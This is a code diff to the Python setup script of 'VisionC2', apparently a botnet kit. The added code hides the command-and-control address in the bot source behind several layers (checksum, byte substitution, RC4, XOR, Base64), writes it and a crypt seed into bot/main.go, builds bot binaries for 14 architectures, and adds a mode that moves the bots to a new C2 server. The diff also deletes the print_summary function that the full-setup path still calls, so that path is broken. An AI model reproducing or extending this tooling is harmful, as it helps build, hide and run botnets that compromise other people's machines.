@@ -145,17 +145,140 @@ def generate_protocol_version() -> str:
     return random.choice(formats)
 
 
-def obfuscate_c2(c2_address: str, xor_key: int = 0x55) -> str:
-    """Generate XOR+Base64 obfuscated C2 address"""
-    xor_bytes = bytes([ord(c) ^ xor_key for c in c2_address])
-    return base64.b64encode(xor_bytes).decode()
+def generate_crypt_seed() -> str:
+    """Generate random 8-char hex seed for encryption"""
+    return ''.join(random.choice('0123456789abcdef') for _ in range(8))
 
 
-def verify_obfuscation(encoded: str, xor_key: int = 0x55) -> str:
-    """Verify the obfuscation by decoding"""
-    decoded = base64.b64decode(encoded)
-    decrypted = bytes([b ^ xor_key for b in decoded])
-    return decrypted.decode()
+def derive_key_py(seed: str) -> bytes:
+    """Python implementation of key derivation (must match Go)"""
+    import hashlib
+    
+    # Must match Go's mew/mewtwo/celebi/jirachi functions
+    dk = bytes([
+        0x31 ^ 0x64,  # mew()
+        0x72 ^ 0x17,  # mewtwo()
+        0x93 ^ 0xc6,  # celebi()
+        0xa4 ^ 0x81,  # jirachi()
+    ])
+    
+    h = hashlib.md5()
+    h.update(seed.encode())
+    h.update(dk)
+    
+    # Add time-invariant entropy
+    entropy = bytearray([0xDE, 0xAD, 0xBE, 0xEF, 0xCA, 0xFE, 0xBA, 0xBE])
+    for i in range(len(entropy)):
+        entropy[i] ^= (len(seed) + i * 17) & 0xFF
+    h.update(bytes(entropy))
+    
+    return h.digest()
+
+
+def rc4_encrypt(data: bytes, key: bytes) -> bytes:
+    """RC4-like stream cipher (same as Go streamDecrypt)"""
+    # Initialize S-box
+    s = list(range(256))
+    j = 0
+    for i in range(256):
+        j = (j + s[i] + key[i % len(key)]) % 256
+        s[i], s[j] = s[j], s[i]
+    
+    # Generate keystream and encrypt
+    result = bytearray(len(data))
+    i, j = 0, 0
+    for k in range(len(data)):
+        i = (i + 1) % 256
+        j = (j + s[i]) % 256
+        s[i], s[j] = s[j], s[i]
+        result[k] = data[k] ^ s[(s[i] + s[j]) % 256]
+    
+    return bytes(result)
+
+
+def obfuscate_c2(c2_address: str, crypt_seed: str) -> str:
+    """
+    Multi-layer obfuscation matching Go decoder:
+    1. Add MD5 checksum (4 bytes)
+    2. Byte substitution
+    3. RC4 stream encrypt
+    4. XOR with derived key
+    5. Base64 encode
+    """
+    import hashlib
+    
+    payload = c2_address.encode()
+    
+    # Add checksum (last 4 bytes of MD5)
+    h = hashlib.md5()
+    h.update(payload)
+    checksum = h.digest()[:4]
+    data = payload + checksum
+    
+    # Layer 4 (reverse): Byte substitution
+    substituted = bytearray(len(data))
+    for i in range(len(data)):
+        b = data[i]
+        b ^= 0xAA
+        b = ((b >> 3) | (b << 5)) & 0xFF  # Rotate left 5
+        substituted[i] = b
+    
+    # Layer 3 (reverse): RC4 stream encrypt
+    key = derive_key_py(crypt_seed)
+    rc4_encrypted = rc4_encrypt(bytes(substituted), key)
+    
+    # Layer 2 (reverse): XOR with rotating key
+    xored = bytearray(len(rc4_encrypted))
+    for i in range(len(rc4_encrypted)):
+        xored[i] = rc4_encrypted[i] ^ key[i % len(key)]
+    
+    # Layer 1 (reverse): Base64 encode
+    return base64.b64encode(bytes(xored)).decode()
+
+
+def verify_obfuscation(encoded: str, crypt_seed: str, expected: str) -> bool:
+    """Verify by simulating Go decoder"""
+    import hashlib
+    
+    try:
+        # Layer 1: Base64 decode
+        layer1 = base64.b64decode(encoded)
+        
+        # Layer 2: XOR with rotating key
+        key = derive_key_py(crypt_seed)
+        layer2 = bytearray(len(layer1))
+        for i in range(len(layer1)):
+            layer2[i] = layer1[i] ^ key[i % len(key)]
+        
+        # Layer 3: RC4 decrypt
+        layer3 = rc4_encrypt(bytes(layer2), key)  # RC4 is symmetric
+        
+        # Layer 4: Reverse byte substitution
+        result = bytearray(len(layer3))
+        for i in range(len(layer3)):
+            b = layer3[i]
+            b = ((b << 3) | (b >> 5)) & 0xFF  # Rotate right 5
+            b ^= 0xAA
+            result[i] = b
+        
+        # Verify checksum
+        if len(result) < 5:
+            return False
+        
+        payload = bytes(result[:-4])
+        checksum = bytes(result[-4:])
+        
+        h = hashlib.md5()
+        h.update(payload)
+        expected_checksum = h.digest()[:4]
+        
+        if checksum != expected_checksum:
+            return False
+        
+        return payload.decode() == expected
+    except Exception as e:
+        print(f"Verification error: {e}")
+        return False
 
 
 def update_cnc_main_go(
@@ -191,7 +314,7 @@ def update_cnc_main_go(
 
 
 def update_bot_main_go(
-    bot_path: str, magic_code: str, protocol_version: str, obfuscated_c2: str
+    bot_path: str, magic_code: str, protocol_version: str, obfuscated_c2: str, crypt_seed: str
 ):
     """Update the Bot main.go file with new values"""
     main_go_path = os.path.join(bot_path, "main.go")
@@ -202,6 +325,11 @@ def update_bot_main_go(
     # Update gothTits (obfuscated C2)
     content = re.sub(
         r'const gothTits\s*=\s*"[^"]*"', f'const gothTits = "{obfuscated_c2}"', content
+    )
+
+    # Update cryptSeed
+    content = re.sub(
+        r'const cryptSeed\s*=\s*"[^"]*"', f'const cryptSeed = "{crypt_seed}"', content
     )
 
     # Update magicCode
@@ -328,6 +456,7 @@ def save_config(base_path: str, config: dict):
         f.write("[Security]\n")
         f.write(f"Magic Code: {config['magic_code']}\n")
         f.write(f"Protocol Version: {config['protocol_version']}\n")
+        f.write(f"Crypt Seed: {config['crypt_seed']}\n")
         f.write(f"Obfuscated C2: {config['obfuscated_c2']}\n\n")
 
         f.write("[Certificate]\n")
@@ -349,40 +478,259 @@ def save_config(base_path: str, config: dict):
     return config_path
 
 
-def print_summary(config: dict):
-    """Print final configuration summary"""
+def get_current_config(bot_path: str, cnc_path: str) -> dict:
+    """Extract current configuration from source files"""
+    config = {}
+    
+    # Read bot/main.go
+    bot_main = os.path.join(bot_path, "main.go")
+    if os.path.exists(bot_main):
+        with open(bot_main, "r") as f:
+            content = f.read()
+            
+            # Extract magicCode
+            match = re.search(r'magicCode\s*=\s*"([^"]*)"', content)
+            if match:
+                config["magic_code"] = match.group(1)
+            
+            # Extract protocolVersion
+            match = re.search(r'protocolVersion\s*=\s*"([^"]*)"', content)
+            if match:
+                config["protocol_version"] = match.group(1)
+            
+            # Extract cryptSeed
+            match = re.search(r'const cryptSeed\s*=\s*"([^"]*)"', content)
+            if match:
+                config["crypt_seed"] = match.group(1)
+    
+    # Read cnc/main.go for admin port
+    cnc_main = os.path.join(cnc_path, "main.go")
+    if os.path.exists(cnc_main):
+        with open(cnc_main, "r") as f:
+            content = f.read()
+            
+            match = re.search(r'USER_SERVER_PORT\s*=\s*"([^"]*)"', content)
+            if match:
+                config["admin_port"] = match.group(1)
+    
+    return config
+
+
+def print_menu():
+    """Print the main menu"""
+    print(f"\n{Colors.BRIGHT_CYAN}╔══════════════════════════════════════════════════════════╗{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}              {Colors.BRIGHT_YELLOW}Select Setup Mode{Colors.RESET}                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}╠══════════════════════════════════════════════════════════╣{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_GREEN}[1]{Colors.RESET} Full Setup                                        {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}New C2 address, magic code, certs, everything{Colors.RESET}    {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Use for: Fresh install or complete rebuild{Colors.RESET}       {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_YELLOW}[2]{Colors.RESET} C2 URL Update Only                               {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Change C2 domain/IP, keep magic code & certs{Colors.RESET}     {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}      {Colors.DIM}Use for: Server migration, domain change{Colors.RESET}          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}  {Colors.BRIGHT_RED}[0]{Colors.RESET} Exit                                              {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}║{Colors.RESET}                                                          {Colors.BRIGHT_CYAN}║{Colors.RESET}")
+    print(f"{Colors.BRIGHT_CYAN}╚══════════════════════════════════════════════════════════╝{Colors.RESET}")
+    
+    choice = prompt("Select option", "1")
+    return choice
+
+
+def run_full_setup(base_path: str, cnc_path: str, bot_path: str):
+    """Run full setup - everything new"""
+    config = {}
+
+    # Step 1: C2 Address
+    print_step(1, 5, "C2 Server Configuration")
+
+    c2_ip = prompt("Enter C2 server IP/domain", "127.0.0.1")
+    c2_address = f"{c2_ip}:443"
+    config["c2_address"] = c2_address
+
+    admin_port = prompt("Enter admin server port", "420")
+    config["admin_port"] = admin_port
+
+    success(f"C2 configured: {c2_address}")
+    success(f"Admin port: {admin_port}")
+    info("Bot connection port is fixed at 443 (TLS)")
+
+    # Step 2: Security Tokens
+    print_step(2, 5, "Security Token Generation")
+
+    auto_magic = generate_magic_code(16)
+    auto_protocol = generate_protocol_version()
+    crypt_seed = generate_crypt_seed()
+
+    info(f"Auto-generated Magic Code: {Colors.BRIGHT_WHITE}{auto_magic}{Colors.RESET}")
+    info(f"Auto-generated Protocol Version: {Colors.BRIGHT_WHITE}{auto_protocol}{Colors.RESET}")
+    info(f"Auto-generated Crypt Seed: {Colors.BRIGHT_WHITE}{crypt_seed}{Colors.RESET}")
+    print()
+
+    if confirm("Use auto-generated security tokens?"):
+        magic_code = auto_magic
+        protocol_version = auto_protocol
+    else:
+        magic_code = prompt("Enter custom magic code", auto_magic)
+        protocol_version = prompt("Enter custom protocol version", auto_protocol)
+
+    config["magic_code"] = magic_code
+    config["protocol_version"] = protocol_version
+    config["crypt_seed"] = crypt_seed
+
+    # Obfuscate C2
+    info("Applying multi-layer obfuscation...")
+    obfuscated_c2 = obfuscate_c2(c2_address, crypt_seed)
+    config["obfuscated_c2"] = obfuscated_c2
+
+    if verify_obfuscation(obfuscated_c2, crypt_seed, c2_address):
+        success("C2 address obfuscation verified ✓")
+    else:
+        error("Obfuscation verification failed!")
+        sys.exit(1)
+
+    # Step 3: Certificates
+    print_step(3, 5, "TLS Certificate Generation")
+
+    info("Certificate details (press Enter for defaults):")
+    print()
+
+    cert_config = {
+        "country": prompt("Country code (2 letter)", "US"),
+        "state": prompt("State/Province", "California"),
+        "city": prompt("City", "San Francisco"),
+        "org": prompt("Organization", "Security Research"),
+        "cn": prompt("Common Name (domain)", c2_ip),
+        "days": int(prompt("Valid days", "365")),
+    }
+    config["cert"] = cert_config
+
+    if not generate_certificates(cnc_path, cert_config):
+        error("Certificate generation failed!")
+        if not confirm("Continue without new certificates?"):
+            sys.exit(1)
+    else:
+        success("TLS certificates generated successfully")
+
+    # Step 4: Update Source
+    print_step(4, 5, "Updating Source Code")
+
+    info("Updating cnc/main.go...")
+    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
+        success("CNC configuration updated")
+    else:
+        error("Failed to update CNC configuration")
+
+    info("Updating bot/main.go...")
+    if update_bot_main_go(bot_path, magic_code, protocol_version, obfuscated_c2, crypt_seed):
+        success("Bot configuration updated")
+    else:
+        error("Failed to update Bot configuration")
+
+    # Step 5: Build
+    print_step(5, 5, "Building Binaries")
+
+    if confirm("Build CNC server?"):
+        if build_cnc(cnc_path):
+            success("CNC server built successfully")
+        else:
+            warning("CNC build failed - you can build manually later")
+
+    if confirm("Build bot binaries (14 architectures)?"):
+        warning("This will take several minutes...")
+        if build_bots(bot_path):
+            success("Bot binaries built successfully")
+        else:
+            warning("Bot build had issues - check bot/bins/ folder")
+
+    # Save config
+    config_file = save_config(base_path, config)
+    info(f"Configuration saved to: {config_file}")
+
+    print_summary(config)
+
+
+def run_c2_update(base_path: str, cnc_path: str, bot_path: str):
+    """Update C2 URL only - keep existing magic code, protocol, certs"""
+    
+    # Get existing config
+    info("Reading existing configuration...")
+    existing = get_current_config(bot_path, cnc_path)
+    
+    if not existing.get("magic_code") or not existing.get("crypt_seed"):
+        error("Could not read existing configuration!")
+        error("Please run Full Setup instead.")
+        return
+    
+    print()
+    info(f"Current Magic Code: {Colors.BRIGHT_WHITE}{existing.get('magic_code', 'N/A')}{Colors.RESET}")
+    info(f"Current Protocol: {Colors.BRIGHT_WHITE}{existing.get('protocol_version', 'N/A')}{Colors.RESET}")
+    info(f"Current Crypt Seed: {Colors.BRIGHT_WHITE}{existing.get('crypt_seed', 'N/A')}{Colors.RESET}")
+    info(f"Current Admin Port: {Colors.BRIGHT_WHITE}{existing.get('admin_port', 'N/A')}{Colors.RESET}")
+    print()
+    
+    config = {}
+    config["magic_code"] = existing["magic_code"]
+    config["protocol_version"] = existing["protocol_version"]
+    config["crypt_seed"] = existing["crypt_seed"]
+    config["admin_port"] = existing.get("admin_port", "420")
+
+    # Step 1: New C2 Address
+    print_step(1, 2, "New C2 Address")
+
+    c2_ip = prompt("Enter NEW C2 server IP/domain")
+    if not c2_ip:
+        error("C2 address is required!")
+        return
+    
+    c2_address = f"{c2_ip}:443"
+    config["c2_address"] = c2_address
+
+    success(f"New C2 configured: {c2_address}")
+    
+    # Obfuscate with existing crypt_seed
+    info("Applying obfuscation with existing crypt seed...")
+    obfuscated_c2 = obfuscate_c2(c2_address, config["crypt_seed"])
+    config["obfuscated_c2"] = obfuscated_c2
+
+    if verify_obfuscation(obfuscated_c2, config["crypt_seed"], c2_address):
+        success("C2 address obfuscation verified ✓")
+    else:
+        error("Obfuscation verification failed!")
+        sys.exit(1)
+
+    # Step 2: Update & Build
+    print_step(2, 2, "Update & Build")
+
+    # Only update bot with new C2
+    info("Updating bot/main.go with new C2...")
+    if update_bot_main_go(bot_path, config["magic_code"], config["protocol_version"], 
+                          obfuscated_c2, config["crypt_seed"]):
+        success("Bot configuration updated")
+    else:
+        error("Failed to update Bot configuration")
+
+    # Build bots only
+    if confirm("Build bot binaries?"):
+        warning("This will take several minutes...")
+        if build_bots(bot_path):
+            success("Bot binaries built successfully")
+        else:
+            warning("Bot build had issues - check bot/bins/ folder")
+
+    # Summary
     print(f"\n{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}")
-    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ SETUP COMPLETE!{Colors.RESET}")
+    print(f"{Colors.BRIGHT_GREEN}{Colors.BOLD}  ✓ C2 URL UPDATE COMPLETE!{Colors.RESET}")
     print(f"{Colors.BRIGHT_GREEN}{'═' * 60}{Colors.RESET}\n")
 
-    print(f"{Colors.BRIGHT_CYAN}╔══ Configuration Summary ══╗{Colors.RESET}")
-    print(
-        f"  {Colors.YELLOW}C2 Address:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['c2_address']}{Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Admin Port:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['admin_port']}{Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Magic Code:{Colors.RESET}        {Colors.BRIGHT_WHITE}{config['magic_code']}{Colors.RESET}"
-    )
-    print(
-        f"  {Colors.YELLOW}Protocol Version:{Colors.RESET}  {Colors.BRIGHT_WHITE}{config['protocol_version']}{Colors.RESET}"
-    )
-    print(f"{Colors.BRIGHT_CYAN}╚{'═' * 28}╝{Colors.RESET}\n")
-
-    print(f"{Colors.BRIGHT_YELLOW}╔══ Next Steps ══╗{Colors.RESET}")
-    print(f"  {Colors.CYAN}1.{Colors.RESET} Start CNC server:")
-    print(f"     {Colors.DIM}cd cnc && ./cnc{Colors.RESET}")
+    print(f"  {Colors.YELLOW}New C2 Address:{Colors.RESET}  {Colors.BRIGHT_WHITE}{c2_address}{Colors.RESET}")
+    print(f"  {Colors.YELLOW}Magic Code:{Colors.RESET}      {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}")
+    print(f"  {Colors.YELLOW}Certificates:{Colors.RESET}    {Colors.BRIGHT_WHITE}(unchanged){Colors.RESET}")
     print()
-    print(f"  {Colors.CYAN}2.{Colors.RESET} Connect to admin panel:")
-    print(
-        f"     {Colors.DIM}nc {config['c2_address'].split(':')[0]} {config['admin_port']}{Colors.RESET}"
-    )
-    print(f"     {Colors.DIM}Type 'spamtec' at blank screen to login{Colors.RESET}")
+    warning("Deploy new bot binaries from bot/bins/")
+    warning("Existing bots will NOT auto-update - redeploy required")
     print()
-    print(f"  {Colors.CYAN}3.{Colors.RESET} Deploy bot binaries from:")
-    print(f"     {Colors.DIM}bot/bins/{Colors.RESET}")
-    print(f"{Colors.BRIGHT_YELLOW}╚{'═' * 17}╝{Colors.RESET}\n")
 
 
 def main():
@@ -399,140 +747,23 @@ def main():
         error("Cannot find cnc/ or bot/ directories. Run this from VisionC2 root.")
         sys.exit(1)
 
-    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}\n")
+    print(f"{Colors.DIM}Working directory: {base_path}{Colors.RESET}")
 
-    if not confirm("Ready to configure VisionC2?"):
-        print("\nSetup cancelled.")
+    # Show menu
+    choice = print_menu()
+    
+    if choice == "1":
+        info("Starting Full Setup...")
+        run_full_setup(base_path, cnc_path, bot_path)
+    elif choice == "2":
+        info("Starting C2 URL Update...")
+        run_c2_update(base_path, cnc_path, bot_path)
+    elif choice == "0":
+        print("\nExiting.")
         sys.exit(0)
-
-    config = {}
-
-    # ═══════════════════════════════════════════════════════════
-    # Step 1: C2 Address Configuration
-    # ═══════════════════════════════════════════════════════════
-    print_step(1, 5, "C2 Server Configuration")
-
-    c2_ip = prompt("Enter C2 server IP address", "127.0.0.1")
-    c2_address = f"{c2_ip}:443"
-    config["c2_address"] = c2_address
-
-    admin_port = prompt("Enter admin server port", "420")
-    config["admin_port"] = admin_port
-
-    success(f"C2 configured: {c2_address}")
-    success(f"Admin port: {admin_port}")
-    info("Bot connection port is fixed at 443 (TLS)")
-
-    # ═══════════════════════════════════════════════════════════
-    # Step 2: Security Tokens
-    # ═══════════════════════════════════════════════════════════
-    print_step(2, 5, "Security Token Generation")
-
-    # Generate random values
-    auto_magic = generate_magic_code(16)
-    auto_protocol = generate_protocol_version()
-
-    info(f"Auto-generated Magic Code: {Colors.BRIGHT_WHITE}{auto_magic}{Colors.RESET}")
-    info(
-        f"Auto-generated Protocol Version: {Colors.BRIGHT_WHITE}{auto_protocol}{Colors.RESET}"
-    )
-    print()
-
-    if confirm("Use auto-generated security tokens?"):
-        magic_code = auto_magic
-        protocol_version = auto_protocol
     else:
-        magic_code = prompt("Enter custom magic code", auto_magic)
-        protocol_version = prompt("Enter custom protocol version", auto_protocol)
-
-    config["magic_code"] = magic_code
-    config["protocol_version"] = protocol_version
-
-    # Obfuscate C2 address
-    obfuscated_c2 = obfuscate_c2(c2_address)
-    config["obfuscated_c2"] = obfuscated_c2
-
-    # Verify
-    verified = verify_obfuscation(obfuscated_c2)
-    if verified == c2_address:
-        success("C2 address obfuscation verified ✓")
-    else:
-        error("Obfuscation verification failed!")
+        error("Invalid option")
         sys.exit(1)
-
-    success(f"Magic Code: {magic_code}")
-    success(f"Protocol Version: {protocol_version}")
-
-    # ═══════════════════════════════════════════════════════════
-    # Step 3: TLS Certificate Configuration
-    # ═══════════════════════════════════════════════════════════
-    print_step(3, 5, "TLS Certificate Generation")
-
-    info("Certificate details (press Enter for defaults):")
-    print()
-
-    cert_config = {
-        "country": prompt("Country code (2 letter)", "US"),
-        "state": prompt("State/Province", "California"),
-        "city": prompt("City", "San Francisco"),
-        "org": prompt("Organization", "Security Research"),
-        "cn": prompt("Common Name (domain)", "secure.local"),
-        "days": int(prompt("Valid days", "365")),
-    }
-    config["cert"] = cert_config
-
-    if not generate_certificates(cnc_path, cert_config):
-        error("Certificate generation failed!")
-        if not confirm("Continue without new certificates?"):
-            sys.exit(1)
-    else:
-        success("TLS certificates generated successfully")
-
-    # ═══════════════════════════════════════════════════════════
-    # Step 4: Update Source Code
-    # ═══════════════════════════════════════════════════════════
-    print_step(4, 5, "Updating Source Code")
-
-    # Update CNC
-    info("Updating cnc/main.go...")
-    if update_cnc_main_go(cnc_path, magic_code, protocol_version, admin_port):
-        success("CNC configuration updated")
-    else:
-        error("Failed to update CNC configuration")
-
-    # Update Bot
-    info("Updating bot/main.go...")
-    if update_bot_main_go(bot_path, magic_code, protocol_version, obfuscated_c2):
-        success("Bot configuration updated")
-    else:
-        error("Failed to update Bot configuration")
-
-    # ═══════════════════════════════════════════════════════════
-    # Step 5: Build
-    # ═══════════════════════════════════════════════════════════
-    print_step(5, 5, "Building Binaries")
-
-    # Build CNC
-    if confirm("Build CNC server?"):
-        if build_cnc(cnc_path):
-            success("CNC server built successfully")
-        else:
-            warning("CNC build failed - you can build manually later")
-
-    # Build Bots
-    if confirm("Build bot binaries (14 architectures)?"):
-        warning("This will take several minutes...")
-        if build_bots(bot_path):
-            success("Bot binaries built successfully")
-        else:
-            warning("Bot build had issues - check bot/bins/ folder")
-
-    # Save configuration
-    config_file = save_config(base_path, config)
-    info(f"Configuration saved to: {config_file}")
-
-    # Print summary
-    print_summary(config)
 
 
 if __name__ == "__main__":
